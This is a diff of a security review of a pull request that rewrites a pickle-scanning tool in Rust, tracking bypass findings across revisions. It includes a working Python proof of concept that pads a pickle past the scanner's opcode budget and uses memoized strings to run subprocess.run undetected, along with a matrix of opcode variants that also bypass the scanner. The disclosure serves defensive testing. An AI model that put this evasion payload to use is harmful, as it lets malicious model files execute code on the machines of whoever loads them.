@@ -1,18 +1,20 @@
 # PR #990 Comprehensive Review — `feat: replace picklescan with Rust-native engine`
 
 **Branch:** `mdangelo/codex/rust-picklescan-rewrite`
-**Latest audited:** `19e7de7a` (rev 6: 45 commits on top of rev 5's `22b2d0df`; closes most rev 5 items but surfaces a new P0)
+**Latest audited:** `9124f929` (rev 7: 4 commits on top of rev 6's `4a0d3113`)
 **Scope:** Rust rewrite of pickle scanner, Python engine removed.
 
-This review combines five specialized agents (Rust core, Python integration, test coverage, CI/packaging, simplification), three Momus/Oracle critical re-reviews, and hands-on QA on 31 synthetic fixtures + 21 committed exploits. At rev 6, **validation gates are fully green**: `pytest` **399 passed**, `cargo test` **62 passed**, `ruff`/`mypy`/`clippy` clean. All 14 rev 5 test failures are resolved.
+This review combines five specialized agents (Rust core, Python integration, test coverage, CI/packaging, simplification), three Momus/Oracle critical re-reviews, and hands-on QA on 31 synthetic fixtures + 21 committed exploits. At rev 7, **validation gates fully green**: `pytest` **403 passed**, `cargo test` **62 passed**, `ruff`/`mypy`/`clippy` clean.
 
 On the repo's own 21 exploit fixtures and 2 safe samples the scanner is **0 FN / 0 FP** across every revision.
 
-> **Rev 6 release-readiness verdict: STILL NOT READY.** The rev 5 PERSID bypass (N5-EXPLOIT-PERSID-NESTED) and 14 test failures are fixed, BUT the rev 5 N5-CRITICAL-RCE-BYPASS was only partially closed — the post-budget tail scanner is now policy-driven via `global_severity()` but still only recognizes the protocol-0/2 text `c<module>\n<name>\n` pattern. It does **not** recognize the protocol-4/5 `\x8c<module>\x94\x8c<name>\x94\x93` (SHORT_BINUNICODE + STACK_GLOBAL) format that `pickle.dumps(obj)` produces **by default on every modern Python**. Verified empirically: **11 out of 11** major dangerous globals (`subprocess.run`, `subprocess.Popen`, `os.system`, `os.popen`, `builtins.eval`, `builtins.exec`, `importlib.reload`, `ctypes.CDLL`, `marshal.loads`, `pickle.loads`, `_ctypes.dlopen`) bypass the post-budget scan when wrapped with 4.5M cheap filler opcodes. I executed `pickle.loads(mal)` on the `subprocess.run(['echo', 'PWNED'])` payload in a sandbox and confirmed `PWNED` prints to stdout. Detailed in **Rev 6 — new findings** below.
+> **Rev 7 release-readiness verdict: STILL NOT READY.** Rev 6's N6-CRITICAL-RCE-BYPASS-V2 is **FIXED** for all 5 string-push opcode variants (SHORT_BINUNICODE / BINUNICODE / BINUNICODE8 / SHORT_BINSTRING / BINSTRING) and all 11 tested dangerous globals now correctly detected. The default `pickle.dumps(evil_obj)` payload past the 1M opcode budget is CRITICAL `POST_BUDGET_GLOBAL`. OBJ / NEWOBJ_EX post-budget are also detected via the reduce-class-byte proximity check. **But a new P0 surfaced**: **N7-CRITICAL-PRE-MEMO-BYPASS**. An attacker who memoizes dangerous module/name strings BEFORE the 1M opcode budget exhausts and then uses `BINGET`/`LONG_BINGET`/`GET` to retrieve them past budget followed by `STACK_GLOBAL + REDUCE` completely bypasses the post-budget tail scan. End-to-end validated: `pickle.loads(mal)` actually executes `subprocess.run(['id'])` and prints `uid=501(mdangelo)...` to stdout; scanner reports `verdict=unknown, findings=0, criticals=0, warnings=0`.
 
 ## Revision history
 
-> **Rev 6 (current)**: Re-audit at `19e7de7a` after 45 commits addressing rev 5. **Closed**: 14 test failures (N5-FAIL-1..14), N5-EXPLOIT-PERSID-NESTED (PERSID now modeled correctly in `validate_pickle_stack_effect` + `has_execution_opcode`), N5-P0-WHEEL-MANYLINUX (maturin-action with `manylinux: 2_28`), N5-P0-RELEASE-PLEASE-EXTRA-FILES-MARKERS (`# x-release-please-version` annotations added), N5-PY1-3/N5-SEC-F4 (STRUCTURAL_TAMPER downgrade removed), N5-P1-DEAD-ADAPTER-NESTED-DOWNGRADE, N5-P1-RULE-CODE-CONFLATION-S902 (`PICKLE_EXPANSION → S214`), most P1 Rust gaps (N5-R1..R20), N5-SEC-F5 (multi-line base64 probe widened), N5-SEC-F6 (memo indexing aligned), N5-SEC-F7 (suspicious string word boundaries), N5-SEC-F9 (PERSID counter dedupe), N5-PY1-5 (DANGEROUS_GLOBAL rule code fallback), N5-PY1-1/2/4/7/8 (scan_stream truncation / short-read / ZIP member), N5-PY1-10 (opcode summary memo aligned with CPython), N5-P1-HOT-PATH-DEFEATED-BY-TORCH-SEED (partially — `b"torch"` → `b"torch.jit"`), N5-P1-SARIF-DUPLICATE-FINDINGS + N5-P1-SARIF-NO-PICKLESCAN-RULE-COVERAGE (supporting rows filtered + new SARIF tests), docs/CHANGELOG/security-model coverage. **NOT closed**: N5-CRITICAL-RCE-BYPASS was only partially fixed (post-budget tail now scans dangerous-global policy but still misses STACK_GLOBAL — see N6-CRITICAL-RCE-BYPASS-V2 below), hot-path skip still defeated for secrets/network on most real ML pickles (shape checks `_has_alnum_secret_shape` / `_has_domain_or_ip_shape` return True for any pickle with letters+digits or an alnum-dot pattern).
+> **Rev 7 (current)**: Re-audit at `9124f929` after 4 commits (`6426cb6e fix: address picklescan review findings`, `ec6e7810`, `b119ead8`, `9124f929`). **Closed**: N6-CRITICAL-RCE-BYPASS-V2 (post-budget tail now recognizes SHORT_BINUNICODE + STACK_GLOBAL and 4 other inline string push opcodes via `record_post_budget_stack_global_pattern` + `read_post_budget_text_operand`); the `has_reduce_class_byte_nearby` check now correctly promotes OBJ/NEWOBJ/NEWOBJ_EX proximate finds to CRITICAL; default `pickle.dumps(evil_obj)` payload past budget is now detected. Also adds an explicit `_MAX_PYTORCH_ZIP_ENTRIES=10_000` pre-open preflight check (`9124f929`) and protocol-1 nested pickle prefix handling (`ec6e7810` + `b119ead8`). **NOT closed**: N6-SKIP-PARTIAL (hot-path skip still defeated for secrets/network). **New P0 surfaced**: **N7-CRITICAL-PRE-MEMO-BYPASS** — pre-memoized strings + BINGET past budget bypasses all detection, 5 variants validated end-to-end.
+>
+> **Rev 6** (`4a0d3113`): Re-audit at `19e7de7a` after 45 commits addressing rev 5. **Closed**: 14 test failures (N5-FAIL-1..14), N5-EXPLOIT-PERSID-NESTED (PERSID now modeled correctly in `validate_pickle_stack_effect` + `has_execution_opcode`), N5-P0-WHEEL-MANYLINUX (maturin-action with `manylinux: 2_28`), N5-P0-RELEASE-PLEASE-EXTRA-FILES-MARKERS (`# x-release-please-version` annotations added), N5-PY1-3/N5-SEC-F4 (STRUCTURAL_TAMPER downgrade removed), N5-P1-DEAD-ADAPTER-NESTED-DOWNGRADE, N5-P1-RULE-CODE-CONFLATION-S902 (`PICKLE_EXPANSION → S214`), most P1 Rust gaps (N5-R1..R20), N5-SEC-F5 (multi-line base64 probe widened), N5-SEC-F6 (memo indexing aligned), N5-SEC-F7 (suspicious string word boundaries), N5-SEC-F9 (PERSID counter dedupe), N5-PY1-5 (DANGEROUS_GLOBAL rule code fallback), N5-PY1-1/2/4/7/8 (scan_stream truncation / short-read / ZIP member), N5-PY1-10 (opcode summary memo aligned with CPython), N5-P1-HOT-PATH-DEFEATED-BY-TORCH-SEED (partially — `b"torch"` → `b"torch.jit"`), N5-P1-SARIF-DUPLICATE-FINDINGS + N5-P1-SARIF-NO-PICKLESCAN-RULE-COVERAGE (supporting rows filtered + new SARIF tests), docs/CHANGELOG/security-model coverage. **NOT closed**: N5-CRITICAL-RCE-BYPASS was only partially fixed (post-budget tail now scans dangerous-global policy but still misses STACK_GLOBAL — see N6-CRITICAL-RCE-BYPASS-V2 below), hot-path skip still defeated for secrets/network on most real ML pickles (shape checks `_has_alnum_secret_shape` / `_has_domain_or_ip_shape` return True for any pickle with letters+digits or an alnum-dot pattern).
 >
 > **Rev 5** (`088835b4`/`9d3862d6`): Re-audit at `22b2d0df` after `fix: close picklescan follow-up review items`. **Closed** P2-DIRECTORY-ERROR-SEVERITY (now INFO), P2-PROTO6-FORWARD-COMPAT (proto 6 magic recognized), P2-OVERSIZED-FRAME-NOT-FLAGGED (record_oversized_frame_notice added but the Rust→Python notice path is broken — see N5-FRAME-NOTICE), P2-WHEEL-MATRIX-INCOMPLETE (macos-15-intel + ubuntu-24.04-arm jobs added). **Surfaced** 14 test failures, 1 exploitable PERSID nested bypass, 2 P0 release-mechanics blockers, 21 P1 Rust correctness gaps, 6 P1 Python integration gaps, and ~30 P2 hygiene items. Details in **Rev 5 — new findings** section below.
 >
@@ -88,6 +90,107 @@ On the repo's own 21 exploit fixtures and 2 safe samples the scanner is **0 FN /
 | `S211` stderr noise                      | warning per process            | **gone** (S211 registered) |
 | Mid-string proto-0 encoded nested        | not probed                     | **detected (S601)**        |
 | `{"outer": b"JUNK" + nested}` small-blob | not probed                     | **detected (S213)**        |
+
+---
+
+## Rev 7 — new findings
+
+After re-pulling at `9124f929`, the rev 6 post-budget bypass is fixed for all 5 string-push opcode variants, OBJ/NEWOBJ_EX/NEWOBJ post-budget are detected via the reduce-class proximity check, and the test suite stays green (403 pytest + 62 cargo test). **One new P0**: pre-memoized string bypass via BINGET/LONG_BINGET/GET past budget.
+
+### **N7-CRITICAL-PRE-MEMO-BYPASS** (validated end-to-end, 5 variants)
+
+The rev 7 commit `6426cb6e fix: address picklescan review findings` plus the earlier `660cf3c8` closes the rev 6 N6-CRITICAL-RCE-BYPASS-V2 by adding `record_post_budget_stack_global_pattern` (`state.rs:2918-2944`) which scans inline `\x8c/\x8d/\x8e/X/T/U` + STACK_GLOBAL sequences. This correctly handles the default `pickle.dumps(obj)` format.
+
+**But the scanner's post-budget tail walker only looks at inline string-push opcodes — it has no knowledge of memoized strings stored before the opcode budget exhausted.** An attacker can put the dangerous module/name strings in memo slots 0 and 1 at the START of the pickle, pad with cheap opcodes until the 1M opcode budget is exhausted, then use `BINGET 0 + BINGET 1 + STACK_GLOBAL + REDUCE` at the tail. The post-budget tail scan sees only `h\x00h\x01\x93...R.` — no `\x8c` or `c` byte — and returns no findings.
+
+**Validated reproduction (executed `pickle.loads` in sandbox, confirmed `id` command ran and printed `uid=501...`):**
+
+```python
+import pickle, subprocess
+header = b'\x80\x04'
+filler = b'\x880' * 4_500_000  # 4.5M NEWTRUE+POP pairs; exhausts 1M budget
+
+def sbu(s):
+    b = s.encode()
+    return bytes([0x8c, len(b)]) + b
+
+pre_memo = sbu('subprocess') + b'\x94' + sbu('run') + b'\x94'
+# ^ PUT 'subprocess' in memo slot 0, 'run' in memo slot 1
+# The memo is populated within the first few opcodes, long before the budget is exhausted.
+tail = b'h\x00h\x01\x93' + sbu('id') + b'\x85R.'
+# ^ BINGET 0 (push 'subprocess'), BINGET 1 (push 'run'),
+#   STACK_GLOBAL (pop 'run', 'subprocess' → subprocess.run),
+#   SHORT_BINUNICODE 'id', TUPLE1, REDUCE, STOP
+mal = header + pre_memo + filler + tail
+
+from modelaudit_picklescan import scan_bytes
+r = scan_bytes(mal)
+assert r.verdict.value == 'unknown'   # NOT MALICIOUS
+assert len(r.findings) == 0           # ZERO findings
+
+# pickle.loads ACTUALLY EXECUTES subprocess.run(['id']):
+pickle.loads(mal)
+# → uid=501(mdangelo) gid=20(staff) groups=20(staff),12(everyone),... printed to stdout
+```
+
+**Full bypass matrix for pre-memo + GET past budget:**
+
+| GET opcode variant | Verdict |
+|---|---|
+| `BINGET` (`h<u8>`) + STACK_GLOBAL + REDUCE | ❌ **bypass** |
+| `LONG_BINGET` (`j<u32 le>`) + STACK_GLOBAL + REDUCE | ❌ **bypass** |
+| `GET` (text `g<int>\n`) + STACK_GLOBAL + REDUCE | ❌ **bypass** |
+| `BINGET` + STACK_GLOBAL + OBJ | ❌ **bypass** |
+| `BINGET` + STACK_GLOBAL + NEWOBJ | ❌ **bypass** |
+
+**Full `PickleScanner().scan()` result on the validated payload:**
+```
+success=False
+total issues: 1
+crits: 0  warns: 0
+sev=info rule=S902 msg=Opcode analysis stopped after reaching max_opcodes=1000000
+```
+
+**Root cause:** `post_budget_global_matches` in `state.rs:2852-2877` only scans for inline byte patterns (`b'c'`, `b'i'`, `record_post_budget_stack_global_pattern`, `record_post_budget_extension_ref`). None of these look up `h<idx>` (BINGET) or `j<u32>` (LONG_BINGET) or `g<int>\n` (GET) against the scanner's `memo: HashMap<usize, StackValue>` which IS populated by the pre-budget walk.
+
+**Required fix:** When encountering a `BINGET`/`LONG_BINGET`/`GET` opcode in the post-budget tail, look up the memoized `StackValue` from `self.memo` (which already contains the pre-budget-populated string literals). If the GET resolves to a string, use it as the module operand; if two consecutive GETs precede a `STACK_GLOBAL` (`\x93`), resolve both from memo and run them through `global_severity()`. The scanner already has all the data it needs — `self.memo` is built during the in-budget walk — the post-budget tail scan just doesn't consult it.
+
+**Alternative / simpler fix:** Before entering the post-budget tail scan, iterate `self.memo` looking for any entry whose `StackValue` is a `Text` / `TextSpan` containing a module/name pair that `global_severity()` considers dangerous. Emit a CRITICAL immediately, regardless of whether those memos are ever GET'd in the tail. (This is over-eager — a pickle might memo 'subprocess' innocently — but it's a safe over-approximation for the post-budget case where analysis is already incomplete.)
+
+**Attacker effort to exploit: trivial.** Replace `pickle.dumps(evil_obj)` with a small custom encoder that emits the pre-memo prefix and cheap filler. No protocol knowledge required beyond what's already public in the Python pickle module docs.
+
+**This is a P0 RCE-bypass merge blocker. Rev 7 is NOT merge ready.**
+
+### Rev 6 items FIXED in rev 7 (verified)
+
+- **N6-CRITICAL-RCE-BYPASS-V2**: FIXED for all 5 inline string-push opcode variants:
+  - `SHORT_BINUNICODE` (`\x8c<u8>`) ✓
+  - `BINUNICODE` (`X<u32 le>`) ✓
+  - `BINUNICODE8` (`\x8d<u64 le>`) ✓
+  - `SHORT_BINSTRING` (`U<u8>`) ✓
+  - `BINSTRING` (`T<u32 le>`) ✓
+  - Tested against 11 dangerous globals: `subprocess.run`, `subprocess.Popen`, `os.system`, `os.popen`, `builtins.eval`, `builtins.exec`, `importlib.reload`, `ctypes.CDLL`, `marshal.loads`, `pickle.loads`, `_ctypes.dlopen` — **all 11 now detected**.
+  - Default `pickle.dumps(Evil())` + 4.5 M filler + REDUCE → verdict=malicious, CRITICAL `POST_BUDGET_GLOBAL` ✓
+- **OBJ/NEWOBJ_EX post-budget proximity detection**: FIXED — `has_reduce_class_byte_nearby` treats `o`/`\x81`/`\x92` as REDUCE-class, so these all promote to CRITICAL.
+- **N6 ZIP entry DoS hardening**: rev 7 adds a pre-open `_MAX_PYTORCH_ZIP_ENTRIES = 10_000` check via `_read_zip_entry_count` that avoids opening pathological archives (`9124f929`).
+- **N6 protocol 1 nested pickle routing**: `b119ead8` + `ec6e7810` add protocol-1 magic byte recognition in the file-type detector and the nested-pickle prefix check.
+
+### Rev 6 items NOT closed in rev 7
+
+- **N6-SKIP-PARTIAL**: UNCHANGED. Hot-path skip still only narrowed `b"torch"` → `b"torch.jit"`. Secrets + network detectors still always run on realistic ML pickles because `_has_alnum_secret_shape` and `_has_domain_or_ip_shape` are trivially true. Realistic 1.8 MB PyTorch state dict still takes ~0.95 s with `pickle_secrets_raw_detector_skipped=None, pickle_network_raw_detector_skipped=None, pickle_jit_raw_detector_skipped=True`. Perf claim does not generalize to real workloads.
+
+### Rev 7 release-readiness
+
+| Status | Severity | Item |
+|---|---|---|
+| ❌ | **P0 RCE BYPASS** | **N7-CRITICAL-PRE-MEMO-BYPASS** — pre-memoized strings + BINGET past budget; validated end-to-end with `pickle.loads()` executing `subprocess.run(['id'])` |
+| ⚠️ | P1 perf | N6-SKIP-PARTIAL — hot-path skip still defeated for secrets/network on realistic ML pickles |
+| ✅ | — | N6-CRITICAL-RCE-BYPASS-V2 fully fixed for 5 inline string-push opcode variants |
+| ✅ | — | ZIP entry DoS preflight check |
+| ✅ | — | Protocol 1 nested pickle routing |
+| ✅ | — | All rev 6 test cases still pass (403 pytest + 62 cargo test) |
+
+**Verdict: STILL NOT MERGE READY.** Rev 7 closed the inline-string bypass surface but the same class of attack is trivially replicable via memo reads. The fix is straightforward: look up BINGET references in `self.memo` during the post-budget tail walk, or iterate the memo table for dangerous string pairs as a safe over-approximation. The scanner already populates the memo during the in-budget walk — only the post-budget lookup is missing.
 
 ---
 
